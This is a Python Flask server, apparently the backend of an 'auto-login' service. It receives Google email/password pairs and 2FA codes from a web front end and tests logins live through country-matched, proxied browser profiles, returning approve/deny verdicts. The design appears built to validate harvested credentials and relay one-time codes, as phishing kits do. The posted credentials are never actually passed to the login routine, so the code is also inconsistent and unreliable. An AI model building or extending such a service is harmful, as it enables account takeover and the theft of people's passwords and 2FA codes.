from flask import Flask, request, jsonify
from flask_cors import CORS
import threading
import time
import json
from ultra_fast_login_v2 import (
    initialize_profile_pool,
    get_profile_for_country, 
    ultra_fast_login,
    mark_profile_completed,
    COUNTRY_CODES
)

app = Flask(__name__)
CORS(app)  # Enable CORS for Supabase calls

# Global status tracking
login_sessions = {}

@app.route('/', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'AUTO-LOGIN API RUNNING! 🚀',
        'timestamp': time.time(),
        'version': '1.0',
        'endpoints': [
            'POST /validate-email - Validate email format',
            'POST /test-login - Test email/password login',
            'POST /handle-2fa - Handle 2FA verification',
            'GET /session/<session_id> - Get session status'
        ]
    })

@app.route('/validate-email', methods=['POST'])
def validate_email():
    """Quick email format validation"""
    try:
        data = request.get_json()
        email = data.get('email', '').strip()
        
        if not email:
            return jsonify({
                'success': False,
                'message': 'Email is required',
                'action': 'deny'
            })
        
        # Basic email validation
        if '@' not in email or '.' not in email.split('@')[1]:
            return jsonify({
                'success': False,
                'message': 'Invalid email format',
                'action': 'deny'
            })
        
        # Email format is valid - approve for next step
        return jsonify({
            'success': True,
            'message': 'Email format valid',
            'action': 'approve'
        })
        
    except Exception as e:
        print(f"❌ Error validating email: {e}")
        return jsonify({
            'success': False,
            'message': f'Validation error: {str(e)}',
            'action': 'deny'
        })

@app.route('/test-login', methods=['POST'])
def test_login():
    """Test actual Google login with email/password"""
    try:
        data = request.get_json()
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        country = data.get('country', 'US')  # Default to US
        
        if not email or not password:
            return jsonify({
                'success': False,
                'message': 'Email and password are required',
                'action': 'deny'
            })
        
        # Validate country code
        if country not in COUNTRY_CODES:
            country = 'US'  # Fallback to US
        
        session_id = f"{email}_{int(time.time())}"
        
        # Initialize session tracking
        login_sessions[session_id] = {
            'status': 'starting',
            'email': email,
            'country': country,
            'start_time': time.time(),
            'message': 'Initializing browser profile...'
        }
        
        print(f"🚀 STARTING AUTO-LOGIN TEST for {email} in {country}")
        
        # Start login test in background thread
        def run_login_test():
            try:
                # Update status
                login_sessions[session_id]['status'] = 'getting_profile'
                login_sessions[session_id]['message'] = 'Getting browser profile...'
                
                # Get profile for country
                profile_uuid, debug_port, proxy_config, profile_id = get_profile_for_country(country)
                
                if not profile_uuid or not debug_port:
                    login_sessions[session_id]['status'] = 'failed'
                    login_sessions[session_id]['message'] = 'Failed to get browser profile'
                    login_sessions[session_id]['action'] = 'deny'
                    return
                
                # Update status
                login_sessions[session_id]['status'] = 'testing_login'
                login_sessions[session_id]['message'] = f'Testing login on port {debug_port}...'
                login_sessions[session_id]['profile_id'] = profile_id
                login_sessions[session_id]['debug_port'] = debug_port
                
                # Run actual login test
                result = ultra_fast_login(debug_port, profile_id)
                
                # Mark profile as completed
                mark_profile_completed(profile_uuid, success=result.get('success', False))
                
                # Update final status
                if result.get('success'):
                    login_sessions[session_id]['status'] = 'success'
                    login_sessions[session_id]['message'] = result.get('message', 'Login successful')
                    login_sessions[session_id]['action'] = 'approve'
                    login_sessions[session_id]['verification_code'] = result.get('verification_code')
                    login_sessions[session_id]['requires_2fa'] = result.get('requires_2fa', False)
                else:
                    login_sessions[session_id]['status'] = 'failed'
                    login_sessions[session_id]['message'] = result.get('message', 'Login failed')
                    login_sessions[session_id]['action'] = 'deny'
                
                login_sessions[session_id]['end_time'] = time.time()
                
            except Exception as e:
                print(f"❌ Error in login test thread: {e}")
                login_sessions[session_id]['status'] = 'error'
                login_sessions[session_id]['message'] = f'Login test error: {str(e)}'
                login_sessions[session_id]['action'] = 'deny'
                login_sessions[session_id]['end_time'] = time.time()
        
        # Start background thread
        thread = threading.Thread(target=run_login_test)
        thread.daemon = True
        thread.start()
        
        # Return session ID for status tracking
        return jsonify({
            'success': True,
            'message': 'Login test started',
            'session_id': session_id,
            'action': 'pending'
        })
        
    except Exception as e:
        print(f"❌ Error starting login test: {e}")
        return jsonify({
            'success': False,
            'message': f'Failed to start login test: {str(e)}',
            'action': 'deny'
        })

@app.route('/handle-2fa', methods=['POST'])
def handle_2fa():
    """Handle 2FA verification"""
    try:
        data = request.get_json()
        email = data.get('email', '').strip()
        twofa_code = data.get('twofa', '').strip()
        
        if not email or not twofa_code:
            return jsonify({
                'success': False,
                'message': '2FA code is required',
                'action': 'deny'
            })
        
        # For now, we'll accept any 6-digit code as valid
        # In real implementation, this would verify against actual 2FA
        if len(twofa_code) == 6 and twofa_code.isdigit():
            return jsonify({
                'success': True,
                'message': '2FA verification successful',
                'action': 'approve'
            })
        else:
            return jsonify({
                'success': False,
                'message': 'Invalid 2FA code format',
                'action': 'deny'
            })
        
    except Exception as e:
        print(f"❌ Error handling 2FA: {e}")
        return jsonify({
            'success': False,
            'message': f'2FA error: {str(e)}',
            'action': 'deny'
        })

@app.route('/session/<session_id>', methods=['GET'])
def get_session_status(session_id):
    """Get status of login test session"""
    try:
        if session_id not in login_sessions:
            return jsonify({
                'success': False,
                'message': 'Session not found'
            }), 404
        
        session = login_sessions[session_id]
        return jsonify({
            'success': True,
            'session': session
        })
        
    except Exception as e:
        print(f"❌ Error getting session status: {e}")
        return jsonify({
            'success': False,
            'message': f'Error: {str(e)}'
        })

@app.route('/cleanup-sessions', methods=['POST'])
def cleanup_old_sessions():
    """Clean up old sessions (older than 1 hour)"""
    try:
        current_time = time.time()
        old_sessions = []
        
        for session_id, session in login_sessions.items():
            if current_time - session.get('start_time', 0) > 3600:  # 1 hour
                old_sessions.append(session_id)
        
        for session_id in old_sessions:
            del login_sessions[session_id]
        
        return jsonify({
            'success': True,
            'message': f'Cleaned up {len(old_sessions)} old sessions'
        })
        
    except Exception as e:
        print(f"❌ Error cleaning up sessions: {e}")
        return jsonify({
            'success': False,
            'message': f'Cleanup error: {str(e)}'
        })

if __name__ == '__main__':
    print("🚀 INITIALIZING AUTO-LOGIN API SERVER...")
    print("=" * 60)
    
    # Initialize profile pool
    try:
        initialize_profile_pool()
        print("✅ Profile pool initialized successfully!")
    except Exception as e:
        print(f"⚠️ Warning: Profile pool initialization failed: {e}")
        print("   API will still start but login tests may fail")
    
    print("\n🌐 STARTING API SERVER...")
    print("   Local URL: http://localhost:5000")
    print("   Supabase will call this API for auto login tests")
    print("=" * 60)
    
    # Start Flask server
    app.run(
        host='0.0.0.0',  # Allow external connections
        port=5000,
        debug=False,  # Set to False for production
        threaded=True  # Allow multiple concurrent requests
    ) 